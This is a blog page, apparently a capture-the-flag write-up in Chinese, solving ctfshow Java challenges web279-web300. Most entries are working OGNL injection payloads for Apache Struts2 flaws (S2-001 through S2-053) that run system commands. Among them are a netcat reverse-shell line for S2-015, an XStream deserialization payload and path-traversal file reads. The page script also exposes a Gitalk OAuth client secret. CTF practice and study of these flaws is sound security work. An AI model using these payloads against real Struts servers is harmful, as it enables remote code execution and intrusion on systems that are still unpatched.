@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]JAVA | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1717739446385">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web279
+Struts2漏洞 S2-001
+payload
+%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;env&quot;})).redirectErr..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1717739446385" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]JAVA</h2>
+            <div class="post-date">2024-03-29</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowjava.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web279">web279</h2>
+<p>Struts2漏洞 S2-001</p>
+<p>payload</p>
+<pre><code class="language-java">%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;env&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+</code></pre>
+<h2 id="web280">web280</h2>
+<p>Struts2漏洞 S2-005</p>
+<p>这个漏洞是对S2-003的绕过</p>
+<ol>
+<li>使用unicode编码(u0023)或8进制(43)绕过对#的限制。</li>
+<li>关掉安全配置(allowStaticMethodAccess、MethodAccessor.denyMethodExecution禁止静态方法调用和类方法执行等）</li>
+</ol>
+<p>找到一个<a href="https://www.wevul.com/6420.html">GUI利用工具</a></p>
+<p>payload</p>
+<pre><code class="language-java">('\43_memberAccess.allowStaticMethodAccess')(a)=true&amp;(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&amp;('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&amp;(g)(('\43mycmd\75\'env\'')(d))&amp;(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&amp;(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&amp;(j)(('\43myres\75new\40byte[51020]')(d))&amp;(k)(('\43mydat.readFully(\43myres)')(d))&amp;(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&amp;(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&amp;(n)(('\43myout.getWriter().println(\43mystr)')(d))
+</code></pre>
+<h2 id="web281">web281</h2>
+<p>Struts2漏洞 S2-007</p>
+<p>在处理类型转换的错误时会存入错误到内存中，在后续调用流程中触发OGNL表达式注入。<br>
+这里age显然是int型，传入payload可导致命令执行。</p>
+<p>payload</p>
+<pre><code class="language-java">' + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream())) + '
+</code></pre>
+<h2 id="web282">web282</h2>
+<p>Struts2漏洞 S2-008<br>
+这是一个复合漏洞，定义不是很明确。<a href="https://www.anquanke.com/post/id/261742">参考文章</a></p>
+<p>devmode.action处开启了开发者模式，可以直接执行命令。</p>
+<p>payload</p>
+<pre><code>debug=command&amp;expression=(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream()))
+</code></pre>
+<h2 id="web283">web283</h2>
+<p>Struts2漏洞 S2-009<br>
+showcase远程代码执行</p>
+<p>正则绕过ParametersIntercepter</p>
+<p>payload</p>
+<pre><code class="language-java">/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]
+</code></pre>
+<h2 id="web284">web284</h2>
+<p>Struts2漏洞 S2-012</p>
+<p>redirect重定向变量</p>
+<p>payload</p>
+<pre><code class="language-java">%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;/bin/bash&quot;,&quot;-c&quot;, &quot;env&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+</code></pre>
+<h2 id="web285">web285</h2>
+<p>Struts2漏洞 S2-013</p>
+<p>&lt;s:a&gt;和&lt;s:url&gt;标签中includeParams=all</p>
+<p>payload</p>
+<pre><code class="language-java">?a=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println('result='+new java.lang.String(#d)),#out.close()}
+</code></pre>
+<h2 id="web286">web286</h2>
+<p>Struts2漏洞 S2-015</p>
+<p>配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p>
+<pre><code class="language-xml">&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;
+    &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt;
+        &lt;result&gt;/{1}.jsp&lt;/result&gt;
+    &lt;/action&gt;
+&lt;/package&gt;
+</code></pre>
+<p>payload</p>
+<pre><code class="language-java">/${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('nc -c sh ip 1337').getInputStream()),#q}.action
+</code></pre>
+<p>回显字数有限，且不能解析特殊字符<code>/</code>，记得urlencode</p>
+<p>使用反弹shell的方式</p>
+<h2 id="web287">web287</h2>
+<p>Struts2漏洞 S2-016</p>
+<p>在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、“redirect:”、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p>
+<p>payload(需要urlencode)</p>
+<pre><code class="language-java">?redirect:${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
+</code></pre>
+<h2 id="web288">web288</h2>
+<p>Struts2漏洞 S2-019</p>
+<p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中。</p>
+<p>payload(需要urlencode)</p>
+<pre><code class="language-java">?debug=command&amp;expression=#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())
+</code></pre>
+<h2 id="web289">web289</h2>
+<p>Struts2漏洞 S2-029</p>
+<p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的对象加入ActionContext中。<br>
+在Struts2中，如下的标签就调用了OGNL进行取值</p>
+<pre><code>&lt;p&gt;parameters: &lt;s:property value=&quot;#parameters.msg&quot; /&gt;&lt;/p&gt;
+</code></pre>
+<p>payload(需要urlencode)</p>
+<pre><code class="language-java">/default.action?message=(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream()))
+</code></pre>
+<h2 id="web290">web290</h2>
+<p>Struts2漏洞 S2-032</p>
+<p>当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。 使用method:Action 前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会。</p>
+<p>payload(需要urlencode)</p>
+<pre><code class="language-java">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&amp;pp=\\A&amp;ppp= &amp;encoding=UTF-8&amp;cmd=env
+</code></pre>
+<h2 id="web291">web291</h2>
+<p>Struts2漏洞 S2-033</p>
+<p>当启用动态方法调用之后，使用了rest插件就可能执行ognl表达式导致任意代码执行。</p>
+<p>payload</p>
+<pre><code class="language-java">/S2-033/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env
+</code></pre>
+<h2 id="web292">web292</h2>
+<p>Struts2漏洞 S2-037</p>
+<p>和S2-033一样，只不过不需要开启动态方法调用。具体<a href="https://blog.sari3l.com/posts/617314e9/">参考文章</a></p>
+<h2 id="web293">web293</h2>
+<p>Struts2漏洞 S2-045</p>
+<p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行。恶意用户可在上传文件时通过修改HTTP请求头中的Content—Type值来触发该漏洞，进而执行系统命令。</p>
+<p>payload</p>
+<pre><code class="language-java">Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream()))).(#ros.flush())}
+</code></pre>
+<h2 id="web294">web294</h2>
+<p>Struts2漏洞 S2-046</p>
+<p>攻击者通过设置Content-Disposition的filename字段或者设置Content-Length超过2G这两种方式来触发异常并导致filename字段的OGNL表达式得到执行从而达到远程攻击的目的。该漏洞与045漏洞成因一样，只是漏洞利用的字段发生了改变。<br>
+与045相同，046也是OGNL注入，但出现在上传请求的文件名字段中，并且需要NULL字节来拆分有效负载和其余字符串。</p>
+<p>payload</p>
+<pre><code class="language-java">filename=&quot;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b&quot;
+//需要将\x00替换为NULL
+</code></pre>
+<h2 id="web295">web295</h2>
+<p>Struts2漏洞 S2-048</p>
+<p>Apache Struts2 2.3.x 系列启用了struts2-struts1-plugin 插件并且存在 struts2-showcase 目录,其漏洞成因是当ActionMessage接收客户可控的参数数据时，由于后续数据拼接传递后处理不当导致任意代码执行。</p>
+<p>payload</p>
+<pre><code>/S2-048/integration/saveGangster.action
+
+name=%25%7b%28%23nike%3d%27multipart%2fform-data%27%29.%28%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3f%28%23_memberAccess%3d%23dm%29%3a%28%28%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d%29.%28%23ognlUtil%3d%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3d%27env%27%29.%28%23iswin%3d%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3d%28%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d%29%29.%28%23p%3dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3d%23p.start%28%29%29.%28%23ros%3d%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2c%23ros%29%29.%28%23ros.flush%28%29%29%7d&amp;age=1&amp;__checkbox_bustedBefore=true&amp;description=1
+</code></pre>
+<h2 id="web296">web296</h2>
+<p>Struts2漏洞 S2-052</p>
+<p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
+<p>这题利用如下payload会报500,使用S2-046漏洞进行利用（等有时间再研究👽）</p>
+<pre><code class="language-xml">&lt;map&gt;
+ &lt;entry&gt;
+ &lt;jdk.nashorn.internal.objects.NativeString&gt;
+ &lt;flags&gt;0&lt;/flags&gt;
+ &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
+ &lt;dataHandler&gt;
+ &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
+ &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
+ &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
+ &lt;initialized&gt;false&lt;/initialized&gt;
+ &lt;opmode&gt;0&lt;/opmode&gt;
+ &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+ &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+ &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
+ &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
+ &lt;command&gt;
+ &lt;string&gt;touch&lt;/string&gt;
+ &lt;string&gt;/tmp/success&lt;/string&gt;
+ &lt;/command&gt;
+ &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+ &lt;/next&gt;
+ &lt;/iter&gt;
+ &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
+ &lt;method&gt;
+ &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
+ &lt;name&gt;start&lt;/name&gt;
+ &lt;parameter-types/&gt;
+ &lt;/method&gt;
+ &lt;name&gt;foo&lt;/name&gt;
+ &lt;/filter&gt;
+ &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
+ &lt;/serviceIterator&gt;
+ &lt;lock/&gt;
+ &lt;/cipher&gt;
+ &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
+ &lt;ibuffer&gt;&lt;/ibuffer&gt;
+ &lt;done&gt;false&lt;/done&gt;
+ &lt;ostart&gt;0&lt;/ostart&gt;
+ &lt;ofinish&gt;0&lt;/ofinish&gt;
+ &lt;closed&gt;false&lt;/closed&gt;
+ &lt;/is&gt;
+ &lt;consumed&gt;false&lt;/consumed&gt;
+ &lt;/dataSource&gt;
+ &lt;transferFlavors/&gt;
+ &lt;/dataHandler&gt;
+ &lt;dataLen&gt;0&lt;/dataLen&gt;
+ &lt;/value&gt;
+ &lt;/jdk.nashorn.internal.objects.NativeString&gt;
+ &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+ &lt;/entry&gt;
+ &lt;entry&gt;
+ &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+ &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+ &lt;/entry&gt;
+&lt;/map&gt;
+</code></pre>
+<h2 id="web297">web297</h2>
+<p>Struts2漏洞 S2-053</p>
+<p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次之后变成另一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+<p>回显有字数限制，使用输出到文件的方式读取env<br>
+payload</p>
+<pre><code class="language-java">%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env &gt;/usr/local/tomcat/webapps/S2-053/1.txt').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+</code></pre>
+<h2 id="web298">web298</h2>
+<p>题目提供了war包，war包实际上是zip格式的，修改后缀为zip然后解压，可以看到index.jsp文件，以及class文件，class文件用jadx来反编译即可看到源码。<br>
+文件结构如下，web.xml用来映射路由和servelet<br>
+<img src="https://fallingskies22.github.io/post-images/1712989415976.png" alt="" loading="lazy"></p>
+<p>payload</p>
+<pre><code>/ctfshow/login?username=admin&amp;password=ctfshow
+</code></pre>
+<h2 id="web299">web299</h2>
+<p>通过提示知道可以任意文件读取,先读取web.xml文件获取映射</p>
+<pre><code>/view-source?file=WEB-INF/web.xml
+</code></pre>
+<p>查看到<code>/getFlag</code>映射后，读取相应class文件</p>
+<pre><code>/view-source?file=WEB-INF/classes/com/ctfshow/servlet/GetFlag.class
+</code></pre>
+<p>读取文件是进行过处理的，没法反编译，具体细节分析有点困难。<br>
+从可读字符中大概能看出会将字符与<code>/fl3g</code>比较。</p>
+<pre><code>/view-source?file=../../../../../fl3g
+</code></pre>
+<h2 id="web300">web300</h2>
+<p>和上题payload相同</p>
+<h2 id="参考文章">参考文章</h2>
+<p>https://www.freebuf.com/articles/web/280245.html</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowphp-fan-xu-lie-hua/">
+                  <h3 class="post-title">
+                    [ctfshow]PHP反序列化
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
